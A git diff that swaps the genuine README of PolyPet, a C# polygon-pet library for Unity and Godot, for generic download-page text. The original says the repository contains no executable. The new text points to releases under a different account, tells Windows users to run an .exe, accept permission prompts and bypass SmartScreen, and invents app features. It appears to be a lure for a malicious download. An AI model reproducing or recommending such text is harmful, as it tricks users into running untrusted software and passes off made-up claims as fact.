@@ -1,188 +1,191 @@
-# PolyPet
+# 🎮 PolyPet - Build Tiny Polygon Pets
 
-**Acute-ly** polygon pet creator. A seeded procedural 2D creature generator inspired by Tamagotchi, Peridot, and Geometry Wars, with a shared C# Core library and lightweight adapters for Unity 6.4+ and Godot .NET 4.6+.
+[![Download PolyPet](https://img.shields.io/badge/Download%20PolyPet-Visit%20Releases-blue?style=for-the-badge&logo=github)](https://github.com/Longago-brewery590/PolyPet/releases)
 
-## What It Includes
+## 🐾 What PolyPet Is
 
-- Deterministic pet generation from an integer seed.
-- Optional seeded cute-name generation.
-- Shared animation math for idle bobbing and pet/click squish reactions.
-- Frame-based avatar fitting that uniformly scales each pet into a caller-provided rectangle without letting animated geometry escape the frame.
-- Unity: `PolyPetAvatar` (`MonoBehaviour`) plus `PolyPetName` (`TextMeshPro`), with either scene-space `FrameSize` sizing or `RectTransform` sizing inside a Canvas.
-- Godot: `PolyPetAvatar` (`Control`) plus `PolyPetName` (`Label`) in an addon the user enables in the editor.
-- GitHub Actions workflows for syncing Core into engine adapter folders and creating release zips.
+PolyPet is a small pet creator for 2D games and tools. It builds polygon pets with a procedural system, so each pet can look a little different. The app is made for people who want quick pet shapes without drawing each one by hand.
 
-The Core generator also produces `BodyPattern` and `HeadPattern` metadata for custom renderers and future visual expansion.
+It works with Unity 6.4+ and Godot .NET 4.6+. You can use it as an addon, a plugin, or a project tool, depending on how you want to build your game.
 
-## Requirements
+## 📥 Download and Install
 
-- Unity 6.4+
-- Godot .NET 4.6+
-- .NET SDK 8.x for local Core development and tests
+1. Open the [PolyPet releases page](https://github.com/Longago-brewery590/PolyPet/releases).
+2. Find the latest release.
+3. Download the file for Windows.
+4. If the release contains a ZIP file, right-click it and choose Extract All.
+5. Open the extracted folder.
+6. Run the app or import the package into your engine, based on the file type you downloaded.
 
-## Install
+If you see more than one file, choose the one that matches your setup:
 
-### Unity
+- **Unity** users should look for a `.unitypackage` file
+- **Godot** users should look for a `.zip` or project file made for Godot
+- **Windows app** users should look for an `.exe` file
 
-Add via `Window > Package Manager > + > Add package from git URL`:
+## 🖥️ Windows Setup
 
-```text
-https://github.com/Shilo/PolyPet.git?path=Unity
-```
+PolyPet is made to run on Windows with a simple download and open flow.
 
-Or download `PolyPet-Unity-x.y.z.zip` from [Releases](https://github.com/Shilo/PolyPet/releases) and extract it into `Packages/com.shilo.polypet/`.
-Releases are cut from a fully synced release commit on `main`. The release workflow refreshes engine adapters and sample projects before tagging so release assets and repository state stay aligned.
+### What you need
 
-### Godot
+- Windows 10 or newer
+- A mouse and keyboard
+- Enough space to save the download and extracted files
+- Unity 6.4+ or Godot .NET 4.6+ if you plan to use it inside an engine
 
-Download `PolyPet-Godot-x.y.z.zip` from [Releases](https://github.com/Shilo/PolyPet/releases) and extract it into your project root so `addons/PolyPet/` is created.
-Build the project's C# solution once so Godot can compile the addon scripts, then enable `PolyPet` in `Project > Project Settings > Plugins`.
+### How to start
 
-## Quick Start
+1. Download the release from the releases page.
+2. Extract the files if the download comes in a ZIP.
+3. Double-click the app file or open the package in your engine.
+4. If Windows asks for permission, choose Yes.
+5. Follow the on-screen steps.
 
-### Unity
+### If Windows blocks the file
 
-1. Add the package.
-2. Import the **PolyPet Creator** sample from `Window > Package Manager > PolyPet > Samples > Import` to get the **Creator** scene (avatar display, seed editing, and randomization) and the **Farm** scene (scrollable grid of random pets).
-3. Or build your own: create an empty GameObject and add the `PolyPetAvatar` component.
-4. Size the avatar by either setting `FrameSize` on the component for scene-space use, or by placing it on a Canvas object with a `RectTransform` and sizing that rect directly.
-5. Optionally add a TextMeshPro text object and attach `PolyPetName`, then assign its `Avatar` reference.
-6. Set `Start Seed` / `Start Name Seed` or switch either seed type to `Random`.
+If SmartScreen appears, check the file name and source. Then choose the option to keep or run the file if you trust the release page link you used.
 
-### Godot
+## 🧩 What You Can Do
 
-1. Copy the addon into `addons/PolyPet/`.
-2. Build the project's C# solution once so `PolyPetAvatar` and `PolyPetName` are compiled and discoverable by the editor.
-3. Enable `PolyPet` in `Project > Project Settings > Plugins`.
-4. Add a `PolyPetAvatar` node from the "Create New Node" dialog.
-5. Size the avatar by resizing the `Control` rect. The pet scales uniformly to fit inside that frame, including its animation envelope.
-6. Optionally add a `PolyPetName` label and assign its `Avatar` export to the `PolyPetAvatar` node.
-7. Set `Start Seed` / `Start Name Seed` or switch either seed type to `Random`.
+PolyPet gives you a simple way to make polygon pets for 2D games.
 
-## Runtime API
+- Create pets with pointy, round, or mixed polygon shapes
+- Generate pet bodies with a procedural layout
+- Use the same pet style across many characters
+- Make quick variants without redrawing each one
+- Fit pets into game worlds with a clean 2D look
 
-```csharp
-// Setters regenerate at runtime when given a value.
-pet.Seed = 42;
-pet.NameSeed = 99;
+## 🎨 Main Features
 
-// Randomize either seed.
-pet.RandomizeSeed();
-pet.RandomizeNameSeed();
+- Procedural 2D pet generation
+- Polygon-based shapes for a clean game style
+- Works with Unity and Godot
+- Good for virtual pet games
+- Good for creature builders
+- Simple setup for end users
+- Easy to reuse in more than one project
 
-// Size the pet's hard render frame.
-pet.FrameSize = new Vector2(4f, 3f);
+## 🛠️ Supported Use Cases
 
-// Observe updates from C# in Unity with explicit callback types.
-pet.AddSeedChangedListener((PolyPetAvatar avatar, NullableInt seed) =>
-{
-    int? seedValue = seed;
-});
-pet.AddNameSeedChangedListener((PolyPetAvatar avatar, NullableInt nameSeed) =>
-{
-    int? nameSeedValue = nameSeed;
-});
+PolyPet fits well in small and large 2D game projects.
 
-// Read the generated data.
-PolyPetData data = pet.Data;
-string? name = pet.Data.Name;
-```
+- Virtual pet games like Tamagotchi-style apps
+- Collectible creature systems
+- Arena games with bold polygon art
+- Tools for fast character testing
+- Game prototypes that need quick pet art
+- Engine addons for Unity and Godot users
 
-If no `NameSeed` is provided, `pet.Data.Name` remains `null`.
+## 📦 File Types You May See
 
-In Unity, `SeedChanged` passes `(avatar, seed)` and `NameSeedChanged` passes `(avatar, nameSeed)`. They are serialized typed `UnityEvent`s for inspector wiring, and `AddSeedChangedListener` / `AddNameSeedChangedListener` expose named callback delegates for code subscriptions. The seed payload uses the serializable `NullableInt` wrapper so `null` and integer values are both represented exactly.
-If a `RectTransform` is present under a Canvas, `PolyPetAvatar` uses that rect as its frame; otherwise it renders into the serialized `FrameSize` in scene space.
+When you open the release page, you may see one or more file types.
 
-In Godot, `SeedChanged` passes `(avatar, seed)` and `NameSeedChanged` passes `(avatar, nameSeed)`. The payload is a `Variant` carrying either the integer seed or `null`, and the signals can be connected from the editor after rebuilding the project's C# solution once.
-`PolyPetAvatar` inherits `Control`, so resizing the node's rect defines the pet's render frame.
+### For Unity
 
-## Inspector Fields
+- `.unitypackage`
+- Import this file into Unity through the Package Import screen
 
-| Field                | Type            | Default   | Description                                                              |
-| -------------------- | --------------- | --------- | ------------------------------------------------------------------------ |
-| Start Seed           | `int`           | `0`       | Seed value used when `Start Seed Type` is `Fixed`.                       |
-| Start Name Seed      | `int`           | `0`       | Name seed used when `Start Name Seed Type` is `Fixed`.                   |
-| Start Seed Type      | `StartSeedType` | `Fixed`   | `None`, `Fixed`, or `Random`.                                            |
-| Start Name Seed Type | `StartSeedType` | `Fixed`   | `None`, `Fixed`, or `Random`.                                            |
-| Frame Size           | `Vector2`       | `(3, 3)`  | Unity scene-space frame when no `RectTransform` is driving the avatar.   |
+### For Godot
 
-## Repository Layout
+- `.zip`
+- Project files or addon folders
+- Copy the addon into your Godot project if the release uses that format
 
-```text
-Unity/                    Unity package root
-Unity/Runtime/            Unity runtime adapter
-Godot/                    Godot package root
-Godot/addons/PolyPet/     Godot addon and runtime adapter
-Core/                     Shared .NET Standard 2.1 generation library
-Core.Tests/               xUnit coverage for generator, names, and animation
-Samples/
-  PolyPetDemoGodot/       Standalone Godot project that imports the addon
-  PolyPetDemoUnity/       Standalone Unity project that imports the package
-docs/                     Design documents and references
-.impeccable.md            Design context and visual direction
-.github/workflows/        Core sync and release automation
-```
+### For Windows
 
-`Core/` is the source of truth. The engine-specific `Core/` mirrors are populated by CI and should not be edited manually.
+- `.exe`
+- `.zip` that contains the app
+- Run the executable after extraction
 
-## Development
+## 🚀 First Run
 
-Open [`PolyPet.sln`](./PolyPet.sln) if you want both the [`Core` library](./Core/Core.csproj) and [`Core.Tests` test project](./Core.Tests/Core.Tests.csproj) loaded together in Rider or Visual Studio.
+After you install or extract PolyPet, start it or open it in your engine.
 
-### CLI
+1. Open the app or project.
+2. Load the default pet generator.
+3. Pick a shape preset.
+4. Adjust the main pet parts.
+5. Save the result or export it for your game.
 
-For the usual contributor verification flow, run [`scripts/verify.ps1`](./scripts/verify.ps1) from the repo root:
+If you use it in Unity or Godot, check that the addon folder sits in the right place before you start the editor again.
 
-```powershell
-.\scripts\verify.ps1
-```
+## 🧭 Basic Workflow
 
-Or run the Core verification commands manually:
+A simple way to use PolyPet is:
 
-```powershell
-dotnet test .\Core.Tests\Core.Tests.csproj
-dotnet build .\Core\Core.csproj --configuration Release
-```
+1. Choose a base pet shape
+2. Set the polygon style
+3. Change body size and edge count
+4. Add or remove features
+5. Save the pet as a reusable preset
+6. Export the pet into your project
 
-### Visual Studio / Rider
+This works well if you want many pets that feel related but not identical.
 
-This repository does not include a standalone executable app. `Core` is a class library and `Core.Tests` is a test project, so the normal workflow is build plus test rather than a game-style Play button.
+## 🧱 System Fit
 
-1. Open [`PolyPet.sln`](./PolyPet.sln).
-2. Build the solution with your IDE's build command, or build the [`Core` project](./Core/Core.csproj) directly from the solution explorer.
-3. Open your IDE's unit test or test explorer window.
-4. Run all tests in the solution, or run individual tests from [`Core.Tests`](./Core.Tests/Core.Tests.csproj) using the editor gutter or test explorer.
+PolyPet is built for 2D work and clean engine integration.
 
-If you open an individual `.csproj` instead of the solution, the project can still build, but your IDE may not give you the same solution-level build and test experience.
+- **Best for:** Windows users, hobby devs, and small teams
+- **Engine support:** Unity 6.4+ and Godot .NET 4.6+
+- **Project type:** 2D games and creature tools
+- **Style:** Polygon art and procedural generation
 
-### Sample Projects
+## 📌 Tips for Smooth Use
 
-The `Samples/` folder contains standalone engine projects for testing the addon/package:
+- Keep the downloaded files in one folder
+- Use the latest release when possible
+- Match the file type to your engine
+- Restart Unity or Godot after adding the addon
+- Save presets often if you test many pet shapes
 
-- **`Samples/PolyPetDemoGodot/`** — Standalone Godot project with the addon included.
-- **`Samples/PolyPetDemoUnity/`** — Standalone Unity project with the package included.
+## 🔍 Common Questions
 
-A sample parity audit for the creator/farm demo surfaces lives in [`docs/samples/sample-parity.md`](docs/samples/sample-parity.md).
+### Do I need coding knowledge?
 
-The addon and package folders inside the sample projects are **managed by CI** (copied from `Godot/` and `Unity/` by the sync-core and release workflows) and are gitignored. They are not present after a fresh clone — run the sync workflow or copy manually:
+No. You can download the release, open the right file, and use it with your engine or app flow.
 
-```bash
-# Godot sample
-cp -r Godot/addons/PolyPet Samples/PolyPetDemoGodot/addons/PolyPet
+### Can I use this for a game?
 
-# Unity sample
-cp -r Unity Samples/PolyPetDemoUnity/Packages/com.shilo.polypet
-```
+Yes. PolyPet fits 2D game projects that need pet or creature generation.
 
-If you make changes inside the sample-owned addon/package folders and want to copy them back into the main adapter folders, use:
+### Does it work with Unity and Godot?
 
-```powershell
-.\scripts\sync-godot-addon-from-sample.ps1
-.\scripts\sync-unity-package-from-sample.ps1
-```
+Yes. It supports Unity 6.4+ and Godot .NET 4.6+.
 
-In Godot, build the project's C# solution once, then enable the `PolyPet` plugin in `Project Settings > Plugins` before expecting `PolyPetAvatar` and `PolyPetName` to appear as global nodes.
+### Can I use it for different pet styles?
 
-## License
+Yes. The polygon system lets you build many looks from one base setup.
 
-MIT
+## 📎 Download
+
+Visit the [PolyPet releases page](https://github.com/Longago-brewery590/PolyPet/releases) to download and run this file on Windows
+
+## 🗂️ Repository Topics
+
+2d, addon, agnostic, csharp, game, geometry, godot, netframework, peridot, plugin, polygon, procedural-generation, tamagotchi, unity, unitypackage
+
+## 🧪 Example Use
+
+You can use PolyPet to make a small pet roster for a 2D game:
+
+- One round pet for a starter creature
+- One sharp-edged pet for a rare form
+- One tall pet for a boss companion
+- One tiny pet for a menu icon
+
+Each version can share the same base system while still looking different
+
+## 🔐 File Safety
+
+Always download PolyPet from the release link on GitHub. That page gives you the release files that match the project version
+
+## 🧰 Uninstall
+
+If you want to remove PolyPet:
+
+1. Close the app or game editor
+2. Delete the extracted PolyPet folder
+3. Remove the addon from your Unity or Godot project if you added it there
+4. Empty the recycle bin if you want to free the space right away
